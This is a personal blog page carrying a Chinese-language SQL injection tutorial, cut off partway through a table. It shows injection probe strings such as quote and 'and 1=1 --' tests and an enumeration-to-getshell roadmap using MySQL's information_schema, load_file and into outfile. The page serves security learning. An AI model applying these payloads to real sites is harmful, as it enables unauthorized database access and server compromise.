<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="SQL注入实验, Hkini, 学习, 生活, 工作, 记录">
    <meta name="description" content="通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的 一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入 的数据，致使非法数据侵入系统。">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->

<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag() {
        dataLayer.push(arguments);
    }

    gtag('js', new Date());
    gtag('config', '');
</script>


    <title>SQL注入实验 | Hkini</title>
    <link rel="icon" type="image/png" href="/medias/logo.png">
    <link rel="stylesheet" type="text/css" href="/libs/prism/prism.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.bootcdn.net/ajax/libs/prism/1.9.0/plugins/line-numbers/prism-line-numbers.css">
    
    <style>
        body{
            background-image: url(/medias/images/3.png);
            background-repeat:no-repeat;
            background-size: 100% 100%;
            background-attachment:fixed;
        }
    </style>



    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    
        <link rel="stylesheet" type="text/css" href="/css/reward.css">
    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="Hkini" type="application/atom+xml">
</head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper head-container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Hkini</span>
                </a>
            </div>
            



<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  
    <li class="menu-level-1">
      <a href="/" class="waves-effect waves-light">
        
        <i class="fas fa-home moz-zoom" style="zoom: 0.6;"></i>
        
        <span>首页</span>
        
      </a>
      
    </li>
  
    <li class="menu-level-1">
      <a href="/" class="waves-effect waves-light">
        
        <i class="fas fa-graduation-cap moz-zoom" style="zoom: 0.6;"></i>
        
        <span>专业</span>
        
        <i class="fas fa-chevron-right moz-zoom" aria-hidden="true" style="zoom: 0.6;"></i>
        
      </a>
      
      <ul class="sub-nav menu-level-2 menus_item_child">
        
  
    <li class="menu-level-2">
      <a href="/categories/%E4%B8%93%E4%B8%9A/%E5%9F%BA%E7%A1%80%E7%90%86%E8%AE%BA" class="waves-effect waves-light">
        
        <i class="fas fa-book moz-zoom" style="zoom: 0.6;"></i>
        
        <span>01基础理论</span>
        
      </a>
      
    </li>
  
    <li class="menu-level-2">
      <a href="/categories/%E4%B8%93%E4%B8%9A/%E6%A1%86%E6%9E%B6" class="waves-effect waves-light">
        
        <i class="fas fa-cubes moz-zoom" style="zoom: 0.6;"></i>
        
        <span>02框架</span>
        
      </a>
      
    </li>
  
    <li class="menu-level-2">
      <a href="/categories/%E4%B8%93%E4%B8%9A/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80" class="waves-effect waves-light">
        
        <i class="fas fa-code moz-zoom" style="zoom: 0.6;"></i>
        
        <span>03编程语言</span>
        
      </a>
      
    </li>
  
    <li class="menu-level-2">
      <a href="/categories/%E4%B8%93%E4%B8%9A/%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE" class="waves-effect waves-light">
        
        <i class="fas fa-project-diagram moz-zoom" style="zoom: 0.6;"></i>
        
        <span>04实践项目</span>
        
      </a>
      
    </li>
  
    <li class="menu-level-2">
      <a href="/categories/%E4%B8%93%E4%B8%9A/%E9%85%8D%E7%BD%AE%E8%AE%B0%E5%BD%95" class="waves-effect waves-light">
        
        <i class="fas fa-tools moz-zoom" style="zoom: 0.6;"></i>
        
        <span>05配置记录</span>
        
      </a>
      
    </li>
  

      </ul>
      
    </li>
  
    <li class="menu-level-1">
      <a href="/" class="waves-effect waves-light">
        
        <i class="fas fa-briefcase moz-zoom" style="zoom: 0.6;"></i>
        
        <span>工作</span>
        
        <i class="fas fa-chevron-right moz-zoom" aria-hidden="true" style="zoom: 0.6;"></i>
        
      </a>
      
      <ul class="sub-nav menu-level-2 menus_item_child">
        
  
    <li class="menu-level-2">
      <a href="/categories/%E5%B7%A5%E4%BD%9C/%E9%A1%B9%E7%9B%AE" class="waves-effect waves-light">
        
        <i class="fas fa-tasks moz-zoom" style="zoom: 0.6;"></i>
        
        <span>01项目</span>
        
      </a>
      
    </li>
  

      </ul>
      
    </li>
  
    <li class="menu-level-1">
      <a href="/" class="waves-effect waves-light">
        
        <i class="fas fa-icons moz-zoom" style="zoom: 0.6;"></i>
        
        <span>兴趣</span>
        
        <i class="fas fa-chevron-right moz-zoom" aria-hidden="true" style="zoom: 0.6;"></i>
        
      </a>
      
      <ul class="sub-nav menu-level-2 menus_item_child">
        
  
    <li class="menu-level-2">
      <a href="/categories/%E5%85%B4%E8%B6%A3/%E9%98%85%E8%AF%BB" class="waves-effect waves-light">
        
        <i class="fas fa-book-open moz-zoom" style="zoom: 0.6;"></i>
        
        <span>01阅读</span>
        
      </a>
      
    </li>
  
    <li class="menu-level-2">
      <a href="/categories/%E5%85%B4%E8%B6%A3/%E7%85%A7%E7%89%87" class="waves-effect waves-light">
        
        <i class="fas fa-image moz-zoom" style="zoom: 0.6;"></i>
        
        <span>02照片</span>
        
      </a>
      
    </li>
  

      </ul>
      
    </li>
  
    <li class="menu-level-1">
      <a href="/" class="waves-effect waves-light">
        
        <i class="fas fa-seedling moz-zoom" style="zoom: 0.6;"></i>
        
        <span>个人成长</span>
        
        <i class="fas fa-chevron-right moz-zoom" aria-hidden="true" style="zoom: 0.6;"></i>
        
      </a>
      
      <ul class="sub-nav menu-level-2 menus_item_child">
        
  
    <li class="menu-level-2">
      <a href="/categories/%E4%B8%AA%E4%BA%BA%E6%88%90%E9%95%BF/%E8%AE%A1%E5%88%92%E4%B8%8E%E6%80%BB%E7%BB%93" class="waves-effect waves-light">
        
        <i class="fas fa-tasks moz-zoom" style="zoom: 0.6;"></i>
        
        <span>01计划与总结</span>
        
      </a>
      
    </li>
  
    <li class="menu-level-2">
      <a href="/categories/%E4%B8%AA%E4%BA%BA%E6%88%90%E9%95%BF/%E6%84%9F%E6%82%9F" class="waves-effect waves-light">
        
        <i class="fas fa-lightbulb moz-zoom" style="zoom: 0.6;"></i>
        
        <span>02感悟</span>
        
      </a>
      
    </li>
  

      </ul>
      
    </li>
  
    <li class="menu-level-1">
      <a href="/" class="waves-effect waves-light">
        
        <i class="fas fa-list moz-zoom" style="zoom: 0.6;"></i>
        
        <span>整理</span>
        
        <i class="fas fa-chevron-right moz-zoom" aria-hidden="true" style="zoom: 0.6;"></i>
        
      </a>
      
      <ul class="sub-nav menu-level-2 menus_item_child">
        
  
    <li class="menu-level-2">
      <a href="/catstags" class="waves-effect waves-light">
        
        <i class="fas fa-bookmark moz-zoom" style="zoom: 0.6;"></i>
        
        <span>分类&标签</span>
        
      </a>
      
    </li>
  
    <li class="menu-level-2">
      <a href="/archives" class="waves-effect waves-light">
        
        <i class="fas fa-file-lines moz-zoom" style="zoom: 0.6;"></i>
        
        <span>归档</span>
        
      </a>
      
    </li>
  
    <li class="menu-level-2">
      <a href="/friends" class="waves-effect waves-light">
        
        <i class="fas fa-address-book moz-zoom" style="zoom: 0.6;"></i>
        
        <span>友链</span>
        
      </a>
      
    </li>
  
    <li class="menu-level-2">
      <a href="/contact" class="waves-effect waves-light">
        
        <i class="fas fa-comments moz-zoom" style="zoom: 0.6;"></i>
        
        <span>留言</span>
        
      </a>
      
    </li>
  
    <li class="menu-level-2">
      <a href="/about" class="waves-effect waves-light">
        
        <i class="fas fa-chart-bar moz-zoom" style="zoom: 0.6;"></i>
        
        <span>统计</span>
        
      </a>
      
    </li>
  

      </ul>
      
    </li>
  
    <li class="menu-level-1">
      <a href="/about" class="waves-effect waves-light">
        
        <i class="fas fa-user-circle moz-zoom" style="zoom: 0.6;"></i>
        
        <span>关于我</span>
        
      </a>
      
    </li>
  

  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search " title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Hkini</div>
        <div class="logo-desc">
            
            一个记录生活、学习和工作的地方。记录生活中的点滴，分享学习的经验和工作中的思考。
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-graduation-cap"></i>
			
			专业
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>

                  <a href="/categories/%E4%B8%93%E4%B8%9A/%E5%9F%BA%E7%A1%80%E7%90%86%E8%AE%BA " style="margin-left:75px">
				  
				   <i class="fa fas fa-book" style="position: absolute;left:50px" ></i>
			      
		          <span>01基础理论</span>
                  </a>
                </li>
              
                <li>

                  <a href="/categories/%E4%B8%93%E4%B8%9A/%E6%A1%86%E6%9E%B6 " style="margin-left:75px">
				  
				   <i class="fa fas fa-cubes" style="position: absolute;left:50px" ></i>
			      
		          <span>02框架</span>
                  </a>
                </li>
              
                <li>

                  <a href="/categories/%E4%B8%93%E4%B8%9A/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80 " style="margin-left:75px">
				  
				   <i class="fa fas fa-code" style="position: absolute;left:50px" ></i>
			      
		          <span>03编程语言</span>
                  </a>
                </li>
              
                <li>

                  <a href="/categories/%E4%B8%93%E4%B8%9A/%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE " style="margin-left:75px">
				  
				   <i class="fa fas fa-project-diagram" style="position: absolute;left:50px" ></i>
			      
		          <span>04实践项目</span>
                  </a>
                </li>
              
                <li>

                  <a href="/categories/%E4%B8%93%E4%B8%9A/%E9%85%8D%E7%BD%AE%E8%AE%B0%E5%BD%95 " style="margin-left:75px">
				  
				   <i class="fa fas fa-tools" style="position: absolute;left:50px" ></i>
			      
		          <span>05配置记录</span>
                  </a>
                </li>
              
            </ul>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-briefcase"></i>
			
			工作
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>

                  <a href="/categories/%E5%B7%A5%E4%BD%9C/%E9%A1%B9%E7%9B%AE " style="margin-left:75px">
				  
				   <i class="fa fas fa-tasks" style="position: absolute;left:50px" ></i>
			      
		          <span>01项目</span>
                  </a>
                </li>
              
            </ul>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-icons"></i>
			
			兴趣
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>

                  <a href="/categories/%E5%85%B4%E8%B6%A3/%E9%98%85%E8%AF%BB " style="margin-left:75px">
				  
				   <i class="fa fas fa-book-open" style="position: absolute;left:50px" ></i>
			      
		          <span>01阅读</span>
                  </a>
                </li>
              
                <li>

                  <a href="/categories/%E5%85%B4%E8%B6%A3/%E7%85%A7%E7%89%87 " style="margin-left:75px">
				  
				   <i class="fa fas fa-image" style="position: absolute;left:50px" ></i>
			      
		          <span>02照片</span>
                  </a>
                </li>
              
            </ul>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-seedling"></i>
			
			个人成长
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>

                  <a href="/categories/%E4%B8%AA%E4%BA%BA%E6%88%90%E9%95%BF/%E8%AE%A1%E5%88%92%E4%B8%8E%E6%80%BB%E7%BB%93 " style="margin-left:75px">
				  
				   <i class="fa fas fa-tasks" style="position: absolute;left:50px" ></i>
			      
		          <span>01计划与总结</span>
                  </a>
                </li>
              
                <li>

                  <a href="/categories/%E4%B8%AA%E4%BA%BA%E6%88%90%E9%95%BF/%E6%84%9F%E6%82%9F " style="margin-left:75px">
				  
				   <i class="fa fas fa-lightbulb" style="position: absolute;left:50px" ></i>
			      
		          <span>02感悟</span>
                  </a>
                </li>
              
            </ul>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-list"></i>
			
			整理
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>

                  <a href="/catstags " style="margin-left:75px">
				  
				   <i class="fa fas fa-bookmark" style="position: absolute;left:50px" ></i>
			      
		          <span>分类&标签</span>
                  </a>
                </li>
              
                <li>

                  <a href="/archives " style="margin-left:75px">
				  
				   <i class="fa fas fa-file-lines" style="position: absolute;left:50px" ></i>
			      
		          <span>归档</span>
                  </a>
                </li>
              
                <li>

                  <a href="/friends " style="margin-left:75px">
				  
				   <i class="fa fas fa-address-book" style="position: absolute;left:50px" ></i>
			      
		          <span>友链</span>
                  </a>
                </li>
              
                <li>

                  <a href="/contact " style="margin-left:75px">
				  
				   <i class="fa fas fa-comments" style="position: absolute;left:50px" ></i>
			      
		          <span>留言</span>
                  </a>
                </li>
              
                <li>

                  <a href="/about " style="margin-left:75px">
				  
				   <i class="fa fas fa-chart-bar" style="position: absolute;left:50px" ></i>
			      
		          <span>统计</span>
                  </a>
                </li>
              
            </ul>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于我
		</a>
          
        </li>
        
        
    </ul>
</div>


        </div>

        
    </nav>

</header>

    
<script src="/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.png')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">SQL注入实验</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/Web%E5%AE%89%E5%85%A8/">
                                <span class="chip bg-color">Web安全</span>
                            </a>
                        
                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
                                <span class="chip bg-color">SQL注入</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E4%B8%93%E4%B8%9A/" class="post-category">
                                专业
                            </a>
                        
                            <a href="/categories/%E4%B8%93%E4%B8%9A/%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE/" class="post-category">
                                实践项目
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2025-05-03
                </div>

                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2025-05-03
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    6k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    22 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        

        
        <!-- 代码块折行 -->
        <style type="text/css">
            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
        </style>
        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <html><head></head><body><h1 id="一sql注入"><a class="markdownIt-Anchor" href="#一sql注入"></a> 一.SQL注入</h1>
<h2 id="一基础知识"><a class="markdownIt-Anchor" href="#一基础知识"></a> （一）基础知识</h2>
<h3 id="1危害"><a class="markdownIt-Anchor" href="#1危害"></a> 1危害：</h3>
<p><strong>（1）操纵数据</strong></p>
<p><strong>（2）数据写入，getshell，网站权限</strong></p>
<hr>
<h3 id="2实质"><a class="markdownIt-Anchor" href="#2实质"></a> 2.实质</h3>
<p><strong>通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的 一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入 的数据，致使非法数据侵入系统。恶意代码（参数值的传入），实现自定义的一种查询</strong></p>
<h3 id="3条件"><a class="markdownIt-Anchor" href="#3条件"></a> 3.条件：</h3>
<p><strong>1.可控制的变量，带入查询数据库，变量为存在过滤，过滤不严谨</strong></p>
<h3 id="4注意"><a class="markdownIt-Anchor" href="#4注意"></a> 4.注意：</h3>
<p>​       <strong>1）注入参数点的位置</strong></p>
<p>​            <strong>2）不同数据库的注入思路不同</strong></p>
<hr>
<h3 id="5sql语句干扰符号"><a class="markdownIt-Anchor" href="#5sql语句干扰符号"></a> 5.SQL语句干扰符号：’，”，%，），}</h3>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#在MySQL中，下面谅两句查询的结果相同</span>
<span class="token keyword">select</span> <span class="token operator">*</span><span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> <span class="token operator">*</span><span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="6通过order-by猜测网页查询的字段数"><a class="markdownIt-Anchor" href="#6通过order-by猜测网页查询的字段数"></a> 6.通过order by猜测网页查询的字段数</h3>
<h3 id="7注入分类"><a class="markdownIt-Anchor" href="#7注入分类"></a> 7.注入分类</h3>
<p><strong>(1)数字型注入</strong></p>
<p>当输入的参数为整型时，则有可能存在数字型注入漏洞。</p>
<p>假设存在一条 URL 为： <a href="HTTP://www.aaa.com/test.php?id=1">HTTP://www.aaa.com/test.php?id=1</a></p>
<p>可以对后台的 SQL 语句猜测为：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>判断数字型漏洞的 SQL 注入点：</strong></p>
<p>**① 先在输入框中输入一个单引号 ’ **</p>
<p>这样的 SQL 语句就会变为：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token number">1</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>不符合语法，所以该语句肯定会出错，导致脚本程序无法从数据库获取数据，从而使原来的页面出现异 常。</p>
<p>**② 在输入框中输入 and 1 = 1 **</p>
<p>SQL语句变为：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>语句正确，执行正常，返回的数据与原始请求无任何差异。</p>
<p>**③ 在数据库中输入 and 1 = 2 **</p>
<p>SQL 语句变为：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>虽然语法正确，语句执行正常，但是逻辑错误，因为 1 = 2 为永假，所以返回数据与原始请求有差异。 如果以上三个步骤全部满足，则程序就可能存在数字型 SQL 注入漏洞。</p>
<p><strong>(2)字符型注入</strong></p>
<p>当输入参数为字符串时，则可能存在字符型注入漏洞。数字型与字符型注入最大的区别在于：数字型不 需要单引号闭合，而<strong>字符型一般需要使用单引号来闭合</strong>。</p>
<p>字符型注入最关键的是如何<strong>闭合 SQL 语句以及注释多余的代码</strong>。</p>
<p>假设后台的 SQL 语句如下：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>判断字符型漏洞的 SQL 注入点：</strong></p>
<p>**① 还是先输入单引号 admin’ 来测试 **</p>
<p>这样的 SQL 语句就会变为：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span>'。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>页面异常。</p>
<p>**② 输入： admin’ and 1 = 1 – **</p>
<p>注意：在 admin 后有一个单引号 ’ ，用于字符串闭合，最后还有一个注释符 – <strong>(两条杠后面还有一个空 格！！！)。</strong></p>
<p>SQL 语句变为：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">and</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>页面显示正确。</p>
<p>**③ 输入： admin’ and 1 = 2 – **</p>
<p>SQL 语句变为：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">and</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">2</span> <span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>页面错误。</p>
<p>满足上面三个步骤则有可能存在字符型 SQL 注入。</p>
<blockquote>
<p><strong>如果没有反应，证明网站未处理，可能没有注入点。如果网页返回404，或者跳转，可能网站有过滤，也可能不存在注入点</strong></p>
</blockquote>
<p><strong>(3)其他类型</strong></p>
<p>Cookie 注入、POST 注 入、延时注入等。 这些类型的注入归根结底也是数字型和字符型注入的不同展现形式或者注入的位置不同。</p>
<p>以下是一些常见的注入叫法：</p>
<ul>
<li>POST注入：注入字段在 POST 数据中</li>
<li>Cookie注入：注入字段在 Cookie 数据中</li>
<li>延时注入：使用数据库延时特性注入</li>
<li>搜索注入：注入处为搜索的地方</li>
<li>base64注入：注入字符串需要经过 base64 加密</li>
</ul>
<h3 id="8注入思路"><a class="markdownIt-Anchor" href="#8注入思路"></a> 8注入思路</h3>
<ul>
<li>
<p>明确数据库类型，权限</p>
</li>
<li>
<p>明确提交方法，参数类型</p>
</li>
<li>
<p>低权限：明确数据库记录信息系统表</p>
<p>​                依次库，表，列，值，注入查询</p>
<p>​                 找后台，登录，获取shell（可能失败）</p>
</li>
<li>
<p>高权限：文件读写，命令执行，注册表读取</p>
</li>
</ul>
<h2 id="二mysql注入"><a class="markdownIt-Anchor" href="#二mysql注入"></a> （二）mysql注入</h2>
<h3 id="1信息收集"><a class="markdownIt-Anchor" href="#1信息收集"></a> 1.信息收集</h3>
<blockquote>
<p>1）操作系统:@@version_compile_cs(不同的系统对数据库操作语句的大小写区分）</p>
<p>2）数据库名:database()</p>
<p>3）数据库用户:user()（专门管理数据库的账户）,root为最高权限，容易导致跨站注入数     据。普通用户：只能注入自己网站。数据库的配置文件决定用户的权限。</p>
<p>4）数据库版本:version()（选择注入）</p>
<p>5）其他网站路径（进行文件读取，为高权限读取做准备）</p>
</blockquote>
<h3 id="2数据注入"><a class="markdownIt-Anchor" href="#2数据注入"></a> 2.数据注入</h3>
<blockquote>
<p>1）低版本（暴力或结合读取查询，表名，列名用猜的方式）</p>
<p>2）高版本（information_schema有据查询）</p>
</blockquote>
<h3 id="3高权限注入"><a class="markdownIt-Anchor" href="#3高权限注入"></a> 3.高权限注入</h3>
<blockquote>
<p>1）常规查询</p>
<p>2）跨库查询</p>
<p>3）文件读写</p>
</blockquote>
<hr>
<h3 id="4数据库自带方法"><a class="markdownIt-Anchor" href="#4数据库自带方法"></a> 4.数据库自带方法</h3>
<blockquote>
<p>database()查询数据库名称</p>
<p>user()查询数据库用户</p>
<p>version()查询数据库版本</p>
<p>information_schema --5.0以上版本才有，储存所有的数据库名，表名，列名，可以通过查询他获取指定数据库下面的表名或列名信息</p>
</blockquote>
<blockquote>
<p>load_file():文件读取  ，</p>
<p>into outfile()或into dumfile():  导出函数</p>
</blockquote>
<h3 id="5information_shema"><a class="markdownIt-Anchor" href="#5information_shema"></a> 5.information_shema</h3>
<blockquote>
<p><strong>在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。</strong></p>
<p><strong>因为非root型的数据库是无法看见数据库表名的</strong></p>
<p><strong>数据库中的”.“表示下一级</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token comment">--记录所有表名信息的表</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<table>
<thead>
<tr>
<th>字段</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>Table_catalog</td>
<td>数据表登记目录</td>
</tr>
<tr>
<td>Table_schema</td>
<td>数据表所属的数据库名</td>
</tr>
<tr>
<td>Table_name</td>
<td>表名称</td>
</tr>
<tr>
<td>Table_type</td>
<td>表类型[system view|base table]</td>
</tr>
<tr>
<td>Engine</td>
<td>使用的数据库引擎[MyISAM|CSV|InnoDB]</td>
</tr>
